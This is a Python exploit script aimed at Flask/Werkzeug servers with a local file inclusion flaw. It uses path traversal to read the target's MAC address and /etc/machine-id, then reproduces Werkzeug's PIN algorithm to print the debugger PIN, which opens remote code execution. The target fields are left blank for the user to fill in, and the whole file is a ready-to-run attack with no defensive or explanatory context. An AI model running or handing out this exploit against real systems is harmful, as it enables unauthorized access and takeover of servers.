#!/usr/bin/env python3

import requests
from base64 import b64encode
import hashlib
from itertools import chain

USER = ''   # Username to authenticate to Werkzeug
PASSWD = '' # Password to authenticate to Werkzeug
creds = b64encode("{0}:{1}".format(USER, PASSWD).encode('UTF-8')).decode('ascii')

IFACE = ''  # Interface name from the remote system (ens33, eth{0,1,...}, etc)
RHOST = ''  # IP address or hostname of the remote system hosting Werkzeug
RPORT = ''  # Remote Port number of the service to access should be an integer, not a string.

LFI_PAGE_DIR = ''   # Directory or page that allows LFI
mac_path = '../../../../../sys/class/net/{0}/address'.format(IFACE) # Path to Mac Address
id_path = '../../../../../etc/machine-id'   # Path to Machine-ID
url = 'http://{0}:{1}/{2}?filename='.format(RHOST, RPORT, LFI_PAGE_DIR)

werk_user = ''  # User Werkzeug runs as. Could be the same as the user for the HTTP Request.

payload = {}
headers = {
    'Authorization': 'Basic {0}'.format(creds)
}

get_node = str(int(requests.request(
    "GET",
    url + mac_path,
    headers=headers,
    data=payload).text.strip().replace(':', ''), base=16))

get_machine_id = requests.request(
    "GET",
    url + id_path,
    headers=headers,
    data=payload
    ).text.strip()

# probably_public_bits = [username, modname,
#                         getattr(app, '__name__', getattr(app.__class__, '__name__')),
#                         getattr(mod, '__file__', None)
#                         ]
probably_public_bits = [
    werk_user,
    'flask.app',
    'Flask',
    '/usr/local/lib/python2.7/dist-packages/flask/app.pyc'
    ]

# uuid.getnode() -> /sys/class/net/<interface>/address
# get_machine_id() -> /etc/machine-id
# private_bits = [str(uuid.getnode()), get_machine_id()]
private_bits = [
    get_node,
    get_machine_id
    ]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
